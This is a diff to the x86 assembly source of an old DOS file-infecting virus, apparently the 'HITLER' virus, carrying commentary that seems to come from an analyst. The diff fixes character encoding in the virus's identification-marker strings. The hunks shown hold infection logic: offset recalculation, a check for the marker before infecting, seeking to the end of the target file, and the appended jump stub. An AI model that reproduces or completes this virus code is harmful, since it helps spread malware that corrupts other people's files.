@@ -16,7 +16,7 @@
 
 
                 call    rakett      ; recalculate offset
-old             db 'ÔøΩ ÔøΩ!ÔøΩ'          ; virus identification marker
+old             db 'Õ ê!≠'          ; virus identification marker
 rakett:         pop     bp
                 push    bp
                 add     bp,-103h
@@ -225,7 +225,7 @@ okay_open:      xchg    bx,ax
                 je      close             ; yes, so go away
                 cmp     old[0],0E9h       ; does it start with a jump?
                 jne     infect1           ; no - infect!
-                cmp     word old[3],'ÔøΩ!'  ; does it start with the HITLER virus
+                cmp     word old[3],'≠!'  ; does it start with the HITLER virus
                 jne     infect1           ; marker? If no, infect!
                                           ; (Boy, this fellow is careful!)
 close:          pop     dx
@@ -276,7 +276,7 @@ infect1:        mov     ax,4202h         ; reset pointer to end of file
 
 putjmp          db 0E9h
                 dw 0
-                db '!ÔøΩ'
+                db '!≠'
 
 install_24:     pushf               ; installation of critical error
                 cli                 ; handler (no shit, Sherlock!)
